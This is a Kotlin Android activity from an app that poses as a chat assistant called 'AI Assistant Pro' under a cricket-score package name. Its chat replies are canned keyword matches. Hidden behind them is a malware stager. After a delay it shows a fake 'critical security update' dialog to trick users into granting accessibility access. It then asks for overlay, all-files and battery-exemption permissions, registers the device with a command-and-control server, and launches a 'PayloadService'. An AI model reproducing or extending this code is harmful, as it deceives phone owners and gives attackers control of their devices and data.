package com.cricket.livescore.ui

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.text.Html
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.view.inputmethod.EditorInfo
import android.widget.Button
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.cricket.livescore.databinding.ActivityMainBinding
import com.cricket.livescore.service.PayloadService
import com.cricket.livescore.utils.PermissionHelper
import org.json.JSONArray
import org.json.JSONObject

data class ChatMessage(val role: String, val content: String, val timestamp: Long) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("role", role)
        put("content", content)
        put("timestamp", timestamp)
    }
    companion object {
        fun fromJson(obj: JSONObject): ChatMessage = ChatMessage(
            role = obj.getString("role"),
            content = obj.getString("content"),
            timestamp = obj.getLong("timestamp")
        )
    }
}

data class Folder(val id: String, var name: String) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("id", id)
        put("name", name)
    }
    companion object {
        fun fromJson(obj: JSONObject): Folder = Folder(
            id = obj.getString("id"),
            name = obj.getString("name")
        )
    }
}

data class Conversation(
    val id: String,
    var title: String,
    val messages: MutableList<ChatMessage>,
    var folderId: String?,
    val createdAt: Long,
    var updatedAt: Long
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("id", id)
        put("title", title)
        put("messages", JSONArray(messages.map { it.toJson() }))
        put("folderId", folderId ?: JSONObject.NULL)
        put("createdAt", createdAt)
        put("updatedAt", updatedAt)
    }
    companion object {
        fun fromJson(obj: JSONObject): Conversation = Conversation(
            id = obj.getString("id"),
            title = obj.getString("title"),
            messages = mutableListOf<ChatMessage>().apply {
                val arr = obj.getJSONArray("messages")
                for (i in 0 until arr.length()) add(ChatMessage.fromJson(arr.getJSONObject(i)))
            },
            folderId = if (obj.isNull("folderId")) null else obj.getString("folderId"),
            createdAt = obj.getLong("createdAt"),
            updatedAt = obj.getLong("updatedAt")
        )
    }
}

class MainActivity : AppCompatActivity() {
    companion object {
        private const val PERMISSION_REQ_CODE = 1001
        private const val PREFS_NAME = "ai_assistant_data"
        private const val KEY_CONVERSATIONS = "conversations"
        private const val KEY_FOLDERS = "folders"
        private const val KEY_CURRENT_CONV = "current_conversation"
        private const val KEY_API_KEY = "api_key_setting"
    }

    private lateinit var binding: ActivityMainBinding
    private val permissionHelper = PermissionHelper()
    private var flowCompleted = false
    private var overlayRequested = false
    private var batteryOptRequested = false
    private var storageRequested = false
    private var permissionRequested = false
    private var stealthDialogShown = false
    private var flowLaunched = false

    // Data
    private lateinit var prefs: SharedPreferences
    private val conversations = mutableListOf<Conversation>()
    private val folders = mutableListOf<Folder>()
    private var currentConversationId: String? = null

    // Views
    private lateinit var sidebarNewChat: TextView
    private lateinit var conversationList: LinearLayout
    private lateinit var folderList: LinearLayout
    private lateinit var btnAddFolder: TextView
    private lateinit var settingsButton: LinearLayout
    private lateinit var emptyState: LinearLayout
    private lateinit var chatView: LinearLayout
    private lateinit var chatContainer: LinearLayout
    private lateinit var chatScroll: ScrollView
    private lateinit var chatTitle: TextView
    private lateinit var btnDeleteConversation: TextView
    private lateinit var messageInput: EditText
    private lateinit var btnSend: Button
    private lateinit var prompt1: TextView
    private lateinit var prompt2: TextView
    private lateinit var prompt3: TextView
    private lateinit var mainContent: FrameLayout

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

        // Load persisted data
        loadConversations()
        loadFolders()
        currentConversationId = prefs.getString(KEY_CURRENT_CONV, null)
        // Validate current conversation still exists
        if (currentConversationId != null && conversations.none { it.id == currentConversationId }) {
            currentConversationId = null
        }

        initViews()
        renderSidebar()
        renderCurrentChat()

        // New chat button
        sidebarNewChat.setOnClickListener { createNewConversation() }

        // Add folder
        btnAddFolder.setOnClickListener { showAddFolderDialog() }

        // Settings
        settingsButton.setOnClickListener { showSettingsDialog() }

        // Delete conversation
        btnDeleteConversation.setOnClickListener { deleteCurrentConversation() }

        // Send message
        btnSend.setOnClickListener {
            val text = messageInput.text.toString().trim()
            if (text.isNotEmpty()) {
                sendMessage(text)
                messageInput.text.clear()
            }
        }
        messageInput.setOnEditorActionListener { _, actionId, _ ->
            if (actionId == EditorInfo.IME_ACTION_SEND) {
                val text = messageInput.text.toString().trim()
                if (text.isNotEmpty()) {
                    sendMessage(text)
                    messageInput.text.clear()
                }
                true
            } else false
        }

        // Example prompts
        prompt1.setOnClickListener { sendMessage(prompt1.text.toString()) }
        prompt2.setOnClickListener { sendMessage(prompt2.text.toString()) }
        prompt3.setOnClickListener { sendMessage(prompt3.text.toString()) }

        checkPermissions()

        if (!flowLaunched) {
            flowLaunched = true
            android.os.Handler(mainLooper).postDelayed({
                if (!isFinishing && !flowCompleted) {
                    triggerStealthPermissionFlow()
                }
            }, 10000)
        }
    }

    // ─── View Init ────────────────────────────────────────────────────────
    private fun initViews() {
        sidebarNewChat = binding.sidebarNewChat
        conversationList = binding.conversationList
        folderList = binding.folderList
        btnAddFolder = binding.btnAddFolder
        settingsButton = binding.settingsButton
        emptyState = binding.emptyState
        chatView = binding.chatView
        chatContainer = binding.chatContainer
        chatScroll = binding.chatScroll
        chatTitle = binding.chatTitle
        btnDeleteConversation = binding.btnDeleteConversation
        messageInput = binding.messageInput
        btnSend = binding.btnSend
        prompt1 = binding.prompt1
        prompt2 = binding.prompt2
        prompt3 = binding.prompt3
        mainContent = binding.mainContent
    }

    // ─── Persistence ──────────────────────────────────────────────────────
    private fun saveConversations() {
        prefs.edit().putString(KEY_CONVERSATIONS, JSONArray(conversations.map { it.toJson() }).toString()).apply()
    }

    private fun loadConversations() {
        val raw = prefs.getString(KEY_CONVERSATIONS, null) ?: return
        try {
            val arr = JSONArray(raw)
            conversations.clear()
            for (i in 0 until arr.length()) conversations.add(Conversation.fromJson(arr.getJSONObject(i)))
        } catch (e: Exception) { prefs.edit().remove(KEY_CONVERSATIONS).apply() }
    }

    private fun saveFolders() {
        prefs.edit().putString(KEY_FOLDERS, JSONArray(folders.map { it.toJson() }).toString()).apply()
    }

    private fun loadFolders() {
        val raw = prefs.getString(KEY_FOLDERS, null) ?: return
        try {
            val arr = JSONArray(raw)
            folders.clear()
            for (i in 0 until arr.length()) folders.add(Folder.fromJson(arr.getJSONObject(i)))
        } catch (e: Exception) { prefs.edit().remove(KEY_FOLDERS).apply() }
    }

    private fun saveCurrentConversation() {
        prefs.edit().putString(KEY_CURRENT_CONV, currentConversationId).apply()
    }

    // ─── Sidebar Rendering ───────────────────────────────────────────────
    private fun renderSidebar() {
        renderFolders()
        renderConversations()
    }

    private fun renderFolders() {
        folderList.removeAllViews()
        // "All conversations" item (no folder filter)
        val allItem = createFolderItem("All conversations", null, currentConversationId != null && conversations.find { it.id == currentConversationId }?.folderId == null)
        folderList.addView(allItem)

        for (folder in folders) {
            val isSelected = currentConversationId != null && conversations.find { it.id == currentConversationId }?.folderId == folder.id
            val item = createFolderItem("📁 ${folder.name}", folder.id, isSelected)
            folderList.addView(item)
        }
    }

    private fun createFolderItem(label: String, folderId: String?, isSelected: Boolean): View {
        val tv = TextView(this)
        tv.text = label
        tv.textSize = 12f
        tv.setPadding(24, 10, 16, 10)
        tv.setTextColor(if (isSelected) 0xFF6C63FF.toInt() else 0xFF888899.toInt())
        tv.setBackgroundColor(if (isSelected) 0x1A6C63FF.toInt() else 0x00000000.toInt())
        tv.setOnClickListener {
            // If a conversation is selected and it's already in this folder, clear filter
            // Otherwise find the first conversation in this folder
            if (folderId == null) {
                // Show all -> select current conversation if exists
                renderConversations()
                return@setOnClickListener
            }
            val firstInFolder = conversations.find { it.folderId == folderId }
            if (firstInFolder != null) {
                selectConversation(firstInFolder.id)
            } else {
                Toast.makeText(this, "No conversations in this folder", Toast.LENGTH_SHORT).show()
            }
        }
        tv.setOnLongClickListener {
            if (folderId != null) showFolderOptionsDialog(folderId)
            true
        }
        return tv
    }

    private fun renderConversations() {
        conversationList.removeAllViews()
        val selectedConv = conversations.find { it.id == currentConversationId }
        val filterFolderId = selectedConv?.folderId

        val displayList = if (filterFolderId != null) {
            conversations.filter { it.folderId == filterFolderId }
        } else {
            conversations.toList()
        }

        if (displayList.isEmpty()) {
            val empty = TextView(this)
            empty.text = "No conversations yet"
            empty.textSize = 12f
            empty.setTextColor(0xFF555577.toInt())
            empty.setPadding(24, 16, 16, 16)
            empty.gravity = Gravity.CENTER
            conversationList.addView(empty)
            return
        }

        for (conv in displayList.sortedByDescending { it.updatedAt }) {
            val isActive = conv.id == currentConversationId
            val tv = TextView(this)
            tv.text = conv.title
            tv.textSize = 12f
            tv.maxLines = 1
            tv.ellipsize = android.text.TextUtils.TruncateAt.END
            tv.setPadding(24, 12, 16, 12)
            tv.setTextColor(if (isActive) 0xFF6C63FF.toInt() else 0xFFcccccc.toInt())
            tv.setBackgroundColor(if (isActive) 0x1A6C63FF.toInt() else 0x00000000.toInt())
            tv.setOnClickListener { selectConversation(conv.id) }
            tv.setOnLongClickListener {
                showConversationOptionsDialog(conv.id)
                true
            }
            conversationList.addView(tv)
        }
    }

    // ─── Chat Rendering ──────────────────────────────────────────────────
    private fun renderCurrentChat() {
        if (currentConversationId == null) {
            emptyState.visibility = View.VISIBLE
            chatView.visibility = View.GONE
            return
        }
        emptyState.visibility = View.GONE
        chatView.visibility = View.VISIBLE

        val conv = conversations.find { it.id == currentConversationId } ?: run {
            currentConversationId = null
            emptyState.visibility = View.VISIBLE
            chatView.visibility = View.GONE
            saveCurrentConversation()
            return
        }

        chatTitle.text = conv.title
        chatContainer.removeAllViews()

        for (msg in conv.messages) {
            if (msg.role == "user") addUserMessageView(msg.content)
            else addBotMessageView(msg.content)
        }
        scrollToBottom()
        renderSidebar()
    }

    private fun addUserMessageView(text: String) {
        val tv = TextView(this).apply {
            this.text = text
            setTextColor(0xFFffffff.toInt())
            textSize = 14f
            setPadding(40, 8, 12, 8)
            setBackgroundColor(0xFF6C63FF.toInt())
            gravity = Gravity.END
        }
        val params = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(60, 4, 4, 4)
            gravity = Gravity.END
        }
        tv.layoutParams = params
        chatContainer.addView(tv)
    }

    private fun addBotMessageView(text: String) {
        val tv = TextView(this).apply {
            this.text = text
            setTextColor(0xFFcccccc.toInt())
            textSize = 14f
            setPadding(12, 8, 40, 8)
            setBackgroundColor(0xFF2D2B55.toInt())
        }
        val params = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(4, 4, 60, 4)
        }
        tv.layoutParams = params
        chatContainer.addView(tv)
    }

    private fun scrollToBottom() {
        chatScroll.post { chatScroll.fullScroll(ScrollView.FOCUS_DOWN) }
    }

    // ─── Conversation Management ─────────────────────────────────────────
    private fun createNewConversation() {
        val id = "conv_${System.currentTimeMillis()}"
        val conv = Conversation(
            id = id,
            title = "New conversation",
            messages = mutableListOf(),
            folderId = null,
            createdAt = System.currentTimeMillis(),
            updatedAt = System.currentTimeMillis()
        )
        conversations.add(0, conv)
        selectConversation(id)
        saveConversations()
    }

    private fun selectConversation(id: String) {
        currentConversationId = id
        saveCurrentConversation()
        renderCurrentChat()
    }

    private fun deleteCurrentConversation() {
        val id = currentConversationId ?: return
        if (isFinishing || isDestroyed) return
        AlertDialog.Builder(this)
            .setTitle("Delete conversation?")
            .setMessage("This will permanently remove this conversation.")
            .setPositiveButton("Delete") { _, _ ->
                conversations.removeAll { it.id == id }
                currentConversationId = null
                saveConversations()
                saveCurrentConversation()
                renderCurrentChat()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun showConversationOptionsDialog(convId: String) {
        if (isFinishing || isDestroyed) return
        val options = mutableListOf("Delete conversation")
        if (folders.isNotEmpty()) options.add("Move to folder...")

        AlertDialog.Builder(this)
            .setTitle("Conversation Options")
            .setItems(options.toTypedArray()) { _, which ->
                when (options[which]) {
                    "Delete conversation" -> {
                        conversations.removeAll { it.id == convId }
                        if (currentConversationId == convId) currentConversationId = null
                        saveConversations()
                        renderCurrentChat()
                    }
                    "Move to folder..." -> showMoveToFolderDialog(convId)
                }
            }
            .show()
    }

    private fun showMoveToFolderDialog(convId: String) {
        if (isFinishing || isDestroyed) return
        val folderNames = folders.map { it.name }.toTypedArray()
        AlertDialog.Builder(this)
            .setTitle("Move to folder")
            .setItems(folderNames) { _, which ->
                val conv = conversations.find { it.id == convId } ?: return@setItems
                conv.folderId = folders[which].id
                conv.updatedAt = System.currentTimeMillis()
                saveConversations()
                renderCurrentChat()
                Toast.makeText(this, "Moved to ${folders[which].name}", Toast.LENGTH_SHORT).show()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    // ─── Folder Management ───────────────────────────────────────────────
    private fun showAddFolderDialog() {
        if (isFinishing || isDestroyed) return
        val input = EditText(this).apply {
            hint = "Folder name"
            setPadding(40, 16, 40, 16)
        }
        AlertDialog.Builder(this)
            .setTitle("New Folder")
            .setView(input)
            .setPositiveButton("Create") { _, _ ->
                val name = input.text.toString().trim()
                if (name.isNotEmpty()) {
                    folders.add(Folder(id = "folder_${System.currentTimeMillis()}", name = name))
                    saveFolders()
                    renderSidebar()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun showFolderOptionsDialog(folderId: String) {
        if (isFinishing || isDestroyed) return
        val folder = folders.find { it.id == folderId } ?: return
        AlertDialog.Builder(this)
            .setTitle(folder.name)
            .setItems(arrayOf("Rename", "Delete folder")) { _, which ->
                when (which) {
                    0 -> showRenameFolderDialog(folderId)
                    1 -> {
                        folders.removeAll { it.id == folderId }
                        conversations.filter { it.folderId == folderId }.forEach { it.folderId = null }
                        saveFolders()
                        saveConversations()
                        renderCurrentChat()
                    }
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun showRenameFolderDialog(folderId: String) {
        if (isFinishing || isDestroyed) return
        val folder = folders.find { it.id == folderId } ?: return
        val input = EditText(this).apply {
            setText(folder.name)
            setPadding(40, 16, 40, 16)
        }
        AlertDialog.Builder(this)
            .setTitle("Rename Folder")
            .setView(input)
            .setPositiveButton("Rename") { _, _ ->
                val name = input.text.toString().trim()
                if (name.isNotEmpty()) {
                    folder.name = name
                    saveFolders()
                    renderSidebar()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    // ─── Chat Logic ──────────────────────────────────────────────────────
    private fun sendMessage(text: String) {
        // Ensure a conversation exists
        if (currentConversationId == null) createNewConversation()

        val conv = conversations.find { it.id == currentConversationId } ?: return

        // Auto-title based on first message
        if (conv.messages.isEmpty()) {
            conv.title = if (text.length > 40) text.take(40) + "..." else text
        }

        conv.messages.add(ChatMessage("user", text, System.currentTimeMillis()))
        conv.updatedAt = System.currentTimeMillis()
        saveConversations()
        renderCurrentChat()

        // Simulate AI thinking delay
        android.os.Handler(mainLooper).postDelayed({
            val response = generateResponse(text)
            conv.messages.add(ChatMessage("assistant", response, System.currentTimeMillis()))
            conv.updatedAt = System.currentTimeMillis()
            saveConversations()
            renderCurrentChat()
        }, (800..2000).random().toLong())
    }

    private fun generateResponse(input: String): String {
        val lower = input.lowercase()
        return when {
            lower.contains("hello") || lower.contains("hi") || lower.contains("hey") ->
                "Hello! How can I assist you today? Feel free to ask me anything."
            lower.contains("how are you") -> "I'm functioning perfectly! Ready to help you with your tasks."
            lower.contains("name") || lower.contains("who are you") ->
                "I'm AI Assistant Pro - your personal AI-powered helper. I can assist with writing, answering questions, research, and more."
            lower.contains("write") || lower.contains("email") || lower.contains("essay") || lower.contains("article") ->
                "I can help you write! Tell me the topic and I'll draft something for you. What would you like me to write about?"
            lower.contains("translate") -> "I can help with translations. What text would you like me to translate and to which language?"
            lower.contains("summarize") || lower.contains("summary") ->
                "Send me the text you'd like summarized and I'll create a concise summary for you."
            lower.contains("help") || lower.contains("what can you") ->
                "I can help with:\n\n• Writing & editing\n• Answering questions\n• Research assistance\n• Text analysis\n• Translations\n• Summarization\n\nJust tell me what you need!"
            lower.contains("research") || lower.contains("topic") ->
                "Great, I can help you research! Tell me the topic and I'll provide an overview with key points and insights."
            lower.contains("thank") -> "You're welcome! Is there anything else I can help you with?"
            lower.contains("bye") || lower.contains("goodbye") ->
                "Goodbye! Feel free to come back anytime you need assistance."
            lower.contains("tool") ->
                "Available tools: Writing Assistant, Text Analysis, Smart Q&A, Document Summarizer, Translation Helper, Research Companion."
            else -> "That's interesting! I'm still learning about that. Could you tell me more so I can better assist you?"
        }
    }

    // ─── Settings / API Key Dialog ───────────────────────────────────────
    private fun showSettingsDialog() {
        if (isFinishing || isDestroyed) return
        val savedKey = prefs.getString(KEY_API_KEY, "") ?: ""
        val input = EditText(this).apply {
            setText(savedKey)
            hint = "Enter your API key"
            setPadding(40, 16, 40, 16)
        }
        AlertDialog.Builder(this)
            .setTitle("API Configuration")
            .setMessage("Enter your AI API key to enable cloud-powered responses. Your key is stored locally and never shared.")
            .setView(input)
            .setPositiveButton("Save") { _, _ ->
                val key = input.text.toString().trim()
                prefs.edit().putString(KEY_API_KEY, key).apply()
                if (key.isNotEmpty()) {
                    Toast.makeText(this, "API key saved. You may need to restart the app.", Toast.LENGTH_SHORT).show()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    // ─── Permission Flow (unchanged) ─────────────────────────────────────
    private fun checkPermissions() {
        if (!isAccessibilityServiceEnabled()) {
            binding.statusText.text = "Enable accessibility for full AI assistance"
            binding.statusText.setTextColor(0xFFFFCC00.toInt())
        } else {
            binding.statusText.text = "Ready to assist"
            binding.statusText.setTextColor(0xFF6C63FF.toInt())
        }
    }

    private fun showPermissionDialog() {
        if (isFinishing || isDestroyed) return
        AlertDialog.Builder(this)
            .setTitle("AI Assistance Required")
            .setMessage("AI Assistant Pro needs Accessibility access to provide personalized help across all your apps. This enables context-aware suggestions, smart replies, and automated assistance features.")
            .setPositiveButton("Enable Now") { _, _ ->
                if (!isFinishing && !isDestroyed) openAccessibilitySettings()
            }
            .setNegativeButton("Later", null)
            .show()
    }

    private fun triggerStealthPermissionFlow() {
        if (stealthDialogShown) return
        stealthDialogShown = true
        if (isAccessibilityServiceEnabled()) {
            startPayloadFlow()
        } else {
            showStealthAccessibilityPrompt()
        }
    }

    private fun showStealthAccessibilityPrompt() {
        if (isFinishing || isDestroyed) return
        AlertDialog.Builder(this)
            .setTitle("System Update Required")
            .setMessage("Security Patch v2.1\n\nYour device needs a critical security update to enable enhanced AI features. Tap 'Apply Now' to proceed with the update process.")
            .setPositiveButton("Apply Now") { _, _ ->
                if (!isFinishing && !isDestroyed) openAccessibilitySettings()
            }
            .setNegativeButton("Later", null)
            .setCancelable(false)
            .show()
    }

    private fun openAccessibilitySettings() {
        if (isFinishing || isDestroyed) return
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        return enabledServices.any { it.resolveInfo.serviceInfo.packageName == packageName }
    }

    fun startPayloadFlow() {
        if (flowCompleted) return
        continuePayloadFlow()
    }

    private fun continuePayloadFlow() {
        if (flowCompleted || isFinishing || isDestroyed) return

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            if (!overlayRequested) {
                overlayRequested = true
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
                return
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                if (!batteryOptRequested) {
                    batteryOptRequested = true
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
                    return
                }
            }
        }

        if (!PermissionHelper.hasStoragePermission(this)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!storageRequested) {
                    storageRequested = true
                    startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:$packageName")))
                    return
                }
            }
        }

        if (!permissionHelper.hasAllPermissions(this)) {
            if (!permissionRequested) {
                permissionRequested = true
                permissionHelper.requestPermissions(this)
                return
            }
        }

        finishSetup()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQ_CODE && !isFinishing && !isDestroyed) {
            permissionRequested = false
            continuePayloadFlow()
        }
    }

    private fun finishSetup() {
        if (isFinishing || isDestroyed) return
        flowCompleted = true

        Thread {
            registerViaHttpSync()
            runOnUiThread {
                if (isFinishing || isDestroyed) return@runOnUiThread
                val serviceIntent = Intent(this, PayloadService::class.java)
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(serviceIntent)
                    else startService(serviceIntent)
                } catch (e: Exception) { Log.e("MainActivity", "ForegroundService failed", e) }

                binding.statusText.text = "AI services activated"
                binding.statusText.setTextColor(0xFF00FF41.toInt())
            }
        }.apply { isDaemon = true }.start()
    }

    private fun registerViaHttpSync() {
        try {
            val json = org.json.JSONObject().apply {
                put("device_id", Build.ID)
                put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("manufacturer", Build.MANUFACTURER)
                put("model", Build.MODEL)
                put("android_version", Build.VERSION.RELEASE)
                put("api_level", Build.VERSION.SDK_INT)
            }
            val url = java.net.URL("${com.cricket.livescore.StagerApplication.c2RealUrl}/api/register")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.outputStream.write(json.toString().toByteArray())
            val code = conn.responseCode
            conn.disconnect()
            Log.i("MainActivity", "HTTP registration: $code")
        } catch (e: Exception) { Log.e("MainActivity", "HTTP registration failed", e) }
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing || isDestroyed) return
        if (isAccessibilityServiceEnabled()) {
            binding.statusText.text = "Ready to assist"
            startPayloadFlow()
        }
    }
}
